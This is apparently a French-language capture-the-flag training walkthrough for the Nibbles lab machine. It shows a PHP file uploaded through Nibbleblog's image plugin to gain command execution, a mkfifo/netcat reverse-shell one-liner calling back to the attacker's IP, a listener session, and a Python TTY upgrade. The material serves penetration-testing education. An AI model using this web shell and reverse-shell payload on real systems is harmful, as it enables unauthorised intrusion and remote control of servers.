---
tags:
  - getting-started
ordre: 17
---

# Nibbles - Prise de contrôle initiale

---

Maintenant que nous sommes connectés au portail d'administration, nous devons essayer de transformer cet accès en exécution de code et, à terme, d'obtenir un accès par shell inversé (reverse shell) au serveur web. Nous savons qu'un module `Metasploit` fonctionnera probablement pour cela, mais énumérons le portail d'administration à la recherche d'autres voies d'attaque. En regardant un peu autour de nous, nous voyons les pages suivantes :

|**Page**|**Contenu**|
|---|---|
|`Publish`|Création d'un nouvel article, d'un article vidéo, d'un article de citation ou d'une nouvelle page. Cela pourrait être intéressant.|
|`Comments`|N'affiche aucun commentaire publié.|
|`Manage`|Permet de gérer les articles, les pages et les catégories. Nous pouvons modifier et supprimer des catégories, ce qui n'est pas très intéressant.|
|`Settings`|En faisant défiler vers le bas, on confirme que la version vulnérable 4.0.3 est utilisée. Plusieurs paramètres sont disponibles, mais aucun ne semble avoir de valeur pour nous.|
|`Themes`|Permet d'installer un nouveau thème à partir d'une liste présélectionnée.|
|`Plugins`|Permet de configurer, d'installer ou de désinstaller des plugins. Le plugin `My image` nous permet de téléverser un fichier image. Pourrait-on abuser de cette fonctionnalité pour téléverser du code `PHP` ?|

Tenter de créer une nouvelle page et d'y intégrer du code ou de téléverser des fichiers ne semble pas être la bonne voie. Allons voir la page des plugins.

![Page des plugins de Nibbleblog montrant les plugins installés : Categories, Hello world, Latest posts, My image, avec des options pour configurer ou désinstaller.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/plugins.png)

Essayons d'utiliser ce plugin pour téléverser un extrait de code `PHP` au lieu d'une image. L'extrait suivant peut être utilisé pour tester l'exécution de code.

```php
<?php system('id'); ?>
```

Enregistrez ce code dans un fichier, puis cliquez sur le bouton `Browse` et téléversez-le.

![Page de configuration du plugin 'My image' de Nibbleblog avec des champs pour le titre, la position, la légende et le téléversement de fichier.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/upload.png)

Nous obtenons un tas d'erreurs, mais il semble que le fichier ait pu être téléversé.

```bash
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Maintenant, nous devons trouver où le fichier a été téléversé, si l'opération a réussi. En revenant aux résultats du brute-forcing de répertoires, nous nous souvenons du répertoire `/content`. Sous celui-ci, il y a un répertoire `plugins` et un autre sous-répertoire pour `my_image`. Le chemin complet est `http://<host>/nibbleblog/content/private/plugins/my_image/`. Dans ce répertoire, nous voyons deux fichiers, `db.xml` et `image.php`, avec une date de dernière modification récente, ce qui signifie que notre téléversement a réussi ! Vérifions si nous avons une exécution de commande.

```bash
Hiterof13@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Oui ! Il semble que nous ayons obtenu une exécution de code à distance sur le serveur web, et que le serveur Apache s'exécute dans le contexte de l'utilisateur `nibbler`. Modifions notre fichier PHP pour obtenir un shell inversé et commencer à explorer le serveur.

Modifions notre fichier PHP local et téléversons-le à nouveau. Cette commande devrait nous donner un shell inversé. Comme mentionné plus tôt dans le module, il existe de nombreuses fiches de référence (cheat sheets) pour les shells inversés. Parmi les meilleures, on trouve [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) et [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Utilisons le one-liner de shell inversé `Bash` suivant et ajoutons-le à notre script `PHP`.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f
```

Nous ajouterons l'adresse IP de notre VPN `tun0` à la place de `<ATTACKING IP>` et un port de notre choix pour `<LISTENING PORT>` afin de recevoir le shell inversé sur notre listener `netcat`. Voir le script `PHP` modifié ci-dessous.

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

Nous téléversons à nouveau le fichier et démarrons un listener `netcat` dans notre terminal :

```bash
0xdf@htb[/htb]$ nc -lvnp 9443  listening on [any] 9443 ...
```

Utilisez `cURL` à nouveau sur la page de l'image ou accédez-y dans `Firefox` à l'adresse [http://nibbleblog/content/private/plugins/my_image/image.php](http://nibbleblog/content/private/plugins/my_image/image.php) pour exécuter le shell inversé.

```bash
Hiterof13@htb[/htb]]$ nc -lvnp 9443  listening on [any] 9443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106 /bin/sh: 0: can't access tty; job control turned off $ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Et voilà, nous avons un shell inversé. Avant de poursuivre avec une énumération supplémentaire, améliorons notre shell en un shell "plus agréable", car celui que nous avons obtenu n'est pas un TTY entièrement interactif et des commandes spécifiques comme `su` ne fonctionneront pas, nous ne pouvons pas utiliser d'éditeurs de texte, la complétion par tabulation ne fonctionne pas, etc. Cet [article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explique plus en détail le problème ainsi que diverses manières de passer à un TTY entièrement interactif. Pour nos besoins, nous utiliserons un one-liner `Python` pour générer un pseudo-terminal afin que des commandes comme `su` et `sudo` fonctionnent, comme nous l'avons vu précédemment dans ce module.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Essayez les différentes techniques pour passer à un TTY complet et choisissez celle qui vous convient le mieux. Notre première tentative échoue car `Python2` semble manquant sur le système !

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'  /bin/sh: 3: python: not found  $ which python3  /usr/bin/python3
```

Nous avons cependant `Python3`, qui fonctionne pour nous donner un shell plus convivial en tapant `python3 -c 'import pty; pty.spawn("/bin/bash")'`. En naviguant vers `/home/nibbler`, nous trouvons le drapeau (flag) `user.txt` ainsi qu'un fichier zip `personal.zip`.

```bash
nibbler@Nibbles:/home/nibbler$ ls  ls personal.zip  user.txt
```

---

← [[16 - Nibbles - Reconnaissance Web]] | [[00 - Sommaire Getting Started|Sommaire]] | [[18 - Nibbles - Élévation de privilèges]] →
